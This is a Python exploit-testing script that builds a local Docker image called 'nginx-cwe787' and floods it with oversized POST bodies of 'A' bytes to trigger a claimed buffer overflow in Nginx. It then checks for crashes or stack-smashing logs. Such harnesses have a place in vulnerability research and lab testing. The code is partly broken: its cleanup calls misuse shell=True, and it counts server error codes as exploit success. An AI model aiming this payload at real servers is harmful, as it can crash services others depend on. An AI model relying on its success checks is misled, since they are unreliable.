#!/usr/bin/env python3

import socket
import time
import subprocess
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama for terminal colors
init()

def log_message(message, level="INFO", color=None):
    """Log a message with timestamp, level and color"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    colors = {
        "INFO": Fore.BLUE,
        "DEBUG": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW
    }
    
    color = color or colors.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")

def print_banner():
    """Print a cool banner"""
    banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════╗
║                                                                ║
║  {Fore.YELLOW}NGINX CWE-787 BUFFER OVERFLOW EXPLOIT TESTER{Fore.RED}           ║
║                                                                ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def build_docker():
    """Build the Docker image"""
    log_message("Building Docker image...", "INFO")
    try:
        subprocess.run(["docker", "build", "-t", "nginx-cwe787", "."], check=True, capture_output=True)
        log_message("✓ Docker image built successfully", "SUCCESS")
        return True
    except subprocess.CalledProcessError as e:
        log_message(f"✗ Error building Docker image: {e}", "ERROR")
        return False

def start_container():
    """Start the Docker container"""
    log_message("Starting container...", "INFO")
    try:
        # Stop any existing containers
        subprocess.run(["docker", "ps", "-q", "--filter", "ancestor=nginx-cwe787"], capture_output=True)
        subprocess.run(["docker", "stop", "$(docker ps -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        subprocess.run(["docker", "rm", "$(docker ps -a -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        
        # Start new container
        result = subprocess.run(
            ["docker", "run", "-d", "-p", "80:80", "nginx-cwe787"],
            capture_output=True,
            text=True
        )
        container_id = result.stdout.strip()
        
        # Wait for Nginx to start
        time.sleep(5)
        log_message(f"✓ Container started with ID: {container_id}", "SUCCESS")
        return container_id
    except Exception as e:
        log_message(f"✗ Error starting container: {e}", "ERROR")
        return None

def get_container_logs(container_id):
    """Get container logs"""
    try:
        result = subprocess.run(
            ["docker", "logs", container_id],
            capture_output=True,
            text=True
        )
        return result.stdout
    except Exception as e:
        log_message(f"✗ Error getting logs: {e}", "ERROR")
        return None

def check_container_status(container_id):
    """Check if container is still running"""
    try:
        result = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Status}}", container_id],
            capture_output=True,
            text=True
        )
        return result.stdout.strip() == "running"
    except:
        return False

def create_overflow_payload(size):
    """Create a payload that will trigger the buffer overflow"""
    overflow_size = size * 2
    payload = b"A" * overflow_size
    return payload

def exploit(host="localhost", port=80, buffer_size=1024):
    """Exploit the CWE-787 vulnerability in ngx_recv.c"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        request = b"POST / HTTP/1.1\r\n"
        request += b"Host: " + host.encode() + b"\r\n"
        request += b"Content-Type: application/octet-stream\r\n"
        
        payload = create_overflow_payload(buffer_size)
        request += b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
        request += payload
        
        log_message(f"Sending payload of {len(payload)} bytes...", "DEBUG")
        s.send(request)
        
        try:
            response = s.recv(4096)
            if response:
                if b"500" in response or b"502" in response:
                    log_message("✓ Server returned error - Possible exploit success!", "SUCCESS")
                elif b"200" in response:
                    log_message("⚠ Server returned 200 OK - Exploit may have failed", "WARNING")
            else:
                log_message("✓ Server did not respond - Possible exploit success!", "SUCCESS")
        except socket.error as e:
            log_message(f"✓ Socket error (possible exploit success): {e}", "SUCCESS")
        
        s.close()
        
    except Exception as e:
        log_message(f"✗ Exploit error: {e}", "ERROR")
        return False
    
    return True

def main():
    print_banner()
    
    # Focus on larger buffer sizes
    buffer_sizes = [131072, 262144, 524288, 1048576, 2097152]  # 128KB, 256KB, 512KB, 1MB, 2MB
    
    log_message("Starting CWE-787 exploit test", "INFO")
    
    if not build_docker():
        log_message("Failed to build Docker image. Aborting.", "ERROR")
        return
    
    container_id = start_container()
    if not container_id:
        log_message("Failed to start container. Aborting.", "ERROR")
        return
    
    try:
        for size in buffer_sizes:
            log_message(f"\nTesting buffer size: {size}", "INFO")
            
            if exploit("localhost", 80, size):
                log_message(f"✓ Test completed for buffer size {size}", "SUCCESS")
            else:
                log_message(f"✗ Test failed for buffer size {size}", "ERROR")
            
            if not check_container_status(container_id):
                log_message("✓ Container crashed - Exploit successful!", "SUCCESS")
                break
            
            logs = get_container_logs(container_id)
            if logs and "stack smashing detected" in logs:
                log_message("✓ Stack smashing detected!", "SUCCESS")
                # Extract only relevant log lines
                relevant_logs = [line for line in logs.split('\n') if any(x in line for x in [
                    "stack smashing detected",
                    "exited on signal",
                    "worker process"
                ])]
                print(f"{Fore.CYAN}{chr(10).join(relevant_logs)}{Style.RESET_ALL}")
            
            time.sleep(2)
            
    finally:
        log_message("Cleaning up container...", "INFO")
        subprocess.run(["docker", "stop", container_id], capture_output=True)
        subprocess.run(["docker", "rm", container_id], capture_output=True)
        log_message("Test finished", "INFO")

if __name__ == "__main__":
    main() 